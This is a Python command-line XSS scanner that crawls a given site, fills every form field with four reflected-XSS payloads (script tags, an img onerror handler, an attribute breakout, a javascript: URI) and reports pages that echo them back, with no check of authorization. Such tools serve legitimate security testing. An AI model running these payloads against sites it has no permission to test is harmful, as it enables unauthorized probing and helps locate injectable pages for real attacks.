#!/usr/bin/env python3
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerable_links = []
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')"
        ]

    def scan(self):
        print(f"[*] Scanning {self.target_url} for XSS vulnerabilities...")
        links = self.extract_links()
        print(f"[*] Found {len(links)} links to test")
        
        for link in links:
            forms = self.extract_forms(link)
            print(f"[*] Testing {link} - Found {len(forms)} forms")
            
            for form in forms:
                for payload in self.payloads:
                    if self.test_form_xss(form, link, payload):
                        print(f"[+] XSS Vulnerability found in {link}")
                        print(f"[+] Payload: {payload}")
                        self.vulnerable_links.append((link, payload))
                        break

        if not self.vulnerable_links:
            print("[-] No XSS vulnerabilities found")
        else:
            print("[+] Found XSS vulnerabilities in the following pages:")
            for link, payload in self.vulnerable_links:
                print(f"    - {link} (Payload: {payload})")

    def extract_links(self):
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.content, "html.parser")
            links = [urljoin(self.target_url, a.get("href")) for a in soup.find_all("a", href=True)]
            return set(links)
        except Exception as e:
            print(f"[-] Error extracting links: {e}")
            return []

    def extract_forms(self, url):
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            print(f"[-] Error extracting forms from {url}: {e}")
            return []

    def test_form_xss(self, form, url, payload):
        try:
            form_details = self.get_form_details(form)
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden":
                    data[input_tag["name"]] = input_tag["value"]
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = payload

            if form_details["method"] == "post":
                response = self.session.post(urljoin(url, form_details["action"]), data=data)
            else:
                response = self.session.get(urljoin(url, form_details["action"]), params=data)

            return payload in response.text
        except Exception as e:
            print(f"[-] Error testing form: {e}")
            return False

    def get_form_details(self, form):
        details = {}
        details["action"] = form.attrs.get("action", "").lower()
        details["method"] = form.attrs.get("method", "get").lower()
        details["inputs"] = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            details["inputs"].append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
            
        return details

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python xss_scanner.py <target_url>")
        sys.exit(1)
    
    scanner = XSSScanner(sys.argv[1])
    scanner.scan()
